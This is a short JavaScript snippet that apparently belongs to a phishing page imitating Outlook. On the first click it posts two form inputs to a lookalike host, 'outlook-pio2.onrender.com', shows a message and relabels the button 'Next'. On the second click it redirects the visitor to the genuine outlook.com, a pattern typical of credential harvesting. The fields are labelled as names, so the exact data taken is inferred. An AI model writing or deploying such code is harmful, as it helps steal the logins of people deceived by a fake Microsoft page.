let clickedOnce = false;

function sendToBackend() {
  if (!clickedOnce) {
    let value1 = document.getElementById("input1").value;
    let value2 = document.getElementById("input2").value;

    fetch("https://outlook-pio2.onrender.com/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ firstName: value1, lastName: value2 }),
    })
      .then(() => {
        // Optional: Clear input fields
        document.getElementById("input1").value = "";
        document.getElementById("input2").value = "";

        // ✅ Show <p> tag
        document.getElementById("myText").style.display = "block";

        // ✅ Optional: Change button text
        document.querySelector("button").textContent = "Next";

        // ✅ Set flag so next click redirects
        clickedOnce = true;
      })
      .catch((err) => console.error("Error sending to backend:", err));
  } else {
    // 🚀 Second click: redirect to another page
    window.location.href = "https://outlook.com"; // Change this to your real link
  }
}
